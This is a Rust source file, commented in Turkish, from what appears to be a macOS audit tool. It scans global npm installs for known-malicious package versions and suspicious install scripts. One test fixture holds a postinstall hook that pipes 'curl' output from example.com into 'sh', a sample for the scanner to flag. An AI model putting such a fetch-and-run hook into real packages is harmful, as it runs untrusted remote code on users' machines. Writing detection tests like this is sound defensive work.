//! Tedarik zinciri kontrolü: genel (global) kurulu npm paketleri arasında
//! zararlı olduğu bilinen ya da şüpheli görünen var mı?
//!
//! Her denetimde hızlı çalışması için yalnızca genel kurulum dizinlerine ve
//! `npx` önbelleğine bakar. Projelerin `node_modules` dizinlerini de kapsayan
//! ayrıntılı tarama `--npm` modundadır; asıl mantık `crate::npm` içindedir.

use super::{Check, Outcome, Severity};
use crate::npm::{self, Finding};
use crate::runner::CommandRunner;

pub struct NpmPackages;

impl Check for NpmPackages {
    fn id(&self) -> &'static str {
        "npm-packages"
    }
    fn name(&self) -> &'static str {
        "Zararlı npm paketleri"
    }
    fn weight(&self) -> u32 {
        15
    }
    fn severity(&self) -> Severity {
        Severity::Critical
    }

    fn run(&self, runner: &dyn CommandRunner) -> Outcome {
        let roots = npm::global_roots(runner);
        if roots.is_empty() {
            return Outcome::pass("Genel npm kurulum dizini bulunamadı; taranacak paket yok.");
        }
        outcome(&npm::scan(&roots))
    }
}

/// Tarama sonucunu kontrol sonucuna çevirir.
fn outcome(scan: &npm::Scan) -> Outcome {
    let malware: Vec<String> = scan.malware().map(describe).collect();
    if !malware.is_empty() {
        return Outcome::fail(
            format!("Zararlı paketler: {}.", malware.join(", ")),
            "Paketi kaldır, anahtar ve parolalarını yenile; ayrıntı için `--npm` ile tara.",
        );
    }

    let suspicious: Vec<String> = scan.suspicious().map(describe).collect();
    if !suspicious.is_empty() {
        return Outcome::warn(
            format!("Şüpheli kurulum betikleri: {}.", suspicious.join(", ")),
            "Betiği incele; ayrıntı ve proje dizinleri için `--npm` ile tara.",
        );
    }

    Outcome::pass(format!(
        "{} genel dizinde {} paket incelendi, zararlı bulunmadı.",
        scan.roots.len(),
        scan.packages
    ))
}

fn describe(finding: &Finding) -> String {
    format!("{}@{} ({})", finding.package, finding.version, finding.reason)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::Status;
    use std::path::PathBuf;

    /// Geçici bir `node_modules` kurup tarar.
    fn scan_fixture(label: &str, manifest: serde_json::Value) -> npm::Scan {
        let root: PathBuf = std::env::temp_dir()
            .join(format!("macos-audit-supply-{label}-{}", std::process::id()));
        let package = root.join("node_modules/paket");
        std::fs::create_dir_all(&package).unwrap();
        std::fs::write(package.join("package.json"), manifest.to_string()).unwrap();

        let scan = npm::scan(&[root.join("node_modules")]);
        std::fs::remove_dir_all(&root).unwrap();
        scan
    }

    #[test]
    fn temiz_paketler_gecer() {
        let scan = scan_fixture("clean", serde_json::json!({ "name": "express", "version": "4.18.2" }));
        let outcome = outcome(&scan);
        assert_eq!(outcome.status, Status::Pass);
        assert!(outcome.detail.contains("1 paket"));
    }

    #[test]
    fn bilinen_zararli_surum_basarisiz() {
        let scan = scan_fixture("known", serde_json::json!({ "name": "chalk", "version": "5.6.1" }));
        let outcome = outcome(&scan);
        assert_eq!(outcome.status, Status::Fail);
        assert!(outcome.detail.contains("chalk@5.6.1"));
    }

    #[test]
    fn supheli_betik_uyari() {
        let scan = scan_fixture(
            "script",
            serde_json::json!({
                "name": "paket",
                "version": "1.0.0",
                "scripts": { "postinstall": "curl -s https://example.com/x | sh" },
            }),
        );
        assert_eq!(outcome(&scan).status, Status::Warn);
    }
}
